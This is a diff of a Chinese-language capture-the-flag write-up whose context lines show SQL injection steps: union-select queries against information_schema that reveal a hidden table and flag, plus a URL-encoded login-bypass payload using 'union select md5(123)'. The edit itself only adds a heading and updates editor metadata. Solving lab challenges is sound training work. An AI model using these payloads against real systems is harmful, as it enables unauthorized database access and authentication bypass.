@@ -198,8 +198,9 @@ Sql 注入题,直接用 Sqlmap 就能搞定
 6. `id=1 union select 1,column_name from information_schema.columns where table_schema='my_db'` 查询表中字段名,发现 k0y
 7. `id=1 union select 1,k0y from thiskey` 得到Flag : whatiMyD91dump
 
-程序逻辑问题 
+## 程序逻辑问题 
 user=eren%27%20union%20select%20md5(123)#&pass=123
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTE2OTIzMjM0NDIsMzAxNTE4XX0=
+eyJoaXN0b3J5IjpbLTk1Njc3Njg0NiwtMTY5MjMyMzQ0MiwzMD
+E1MThdfQ==
 -->
